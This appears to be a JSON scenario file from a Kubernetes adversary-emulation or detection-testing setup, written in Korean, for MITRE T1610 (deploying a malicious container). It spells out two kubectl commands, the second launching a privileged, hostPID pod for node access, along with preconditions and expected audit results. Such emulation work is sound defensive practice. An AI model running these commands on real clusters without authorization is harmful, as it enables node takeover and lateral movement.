{
  "_note": "핵심층 보강 — 실행(Execution). 악성 컨테이너 배포로 발판 확장. 수기 AUTHORED.",
  "env": "k8s-exec-deploy-container",
  "technique": "T1610",
  "procedure": {
    "id": "PROC-exec-deploy-container",
    "name": "악성 컨테이너 배포",
    "description": "과권한 SA 로 privileged/hostPath 파드를 배포해 노드 자원·타 네임스페이스에 새 발판을 만든다.",
    "status": "AUTHORED",
    "steps": [
      {
        "id": "STEP-exec-deploy-pod",
        "seq": 1,
        "command": "kubectl run pwn --image=alpine --restart=Never -n $NS -- sleep 3600",
        "description": "악성 파드 배포(발판 확장)"
      },
      {
        "id": "STEP-exec-deploy-priv",
        "seq": 2,
        "command": "kubectl run pwn-priv --image=alpine --restart=Never --overrides='{\"spec\":{\"hostPID\":true,\"containers\":[{\"name\":\"c\",\"image\":\"alpine\",\"command\":[\"sleep\",\"3600\"],\"securityContext\":{\"privileged\":true}}]}}' -n $NS",
        "description": "privileged/hostPID 파드로 노드 접근"
      }
    ]
  },
  "preconditions": [
    {
      "id": "PRE-exec-deploy-container-create",
      "name": "파드 생성 권한",
      "description": "pods create 권한(과권한 SA) 보유, PodSecurity/Admission 이 막지 않음."
    }
  ],
  "expected_results": [
    {
      "id": "ER-exec-deploy-container-progress",
      "kind": "progress",
      "outcome": {
        "id": "AO-execution",
        "name": "실행 기반 확보"
      },
      "conditions": [
        {
          "channel": "audit",
          "field": "technique",
          "operator": "eq",
          "expected": "T1610"
        }
      ]
    }
  ]
}
